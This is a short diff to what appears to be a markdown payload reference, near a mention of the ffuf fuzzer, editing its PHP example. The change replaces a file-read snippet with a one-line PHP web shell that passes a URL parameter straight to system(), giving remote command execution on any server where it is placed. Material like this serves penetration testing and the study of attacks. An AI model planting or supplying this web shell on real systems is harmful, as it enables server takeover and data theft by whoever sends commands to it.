@@ -20,5 +20,5 @@ ffuf \
 ### PHP
 
 ```php
-<?php echo file_get_contents('/path/to/target/file'); ?>
+<?php echo system($_GET['command']); ?>
 ```
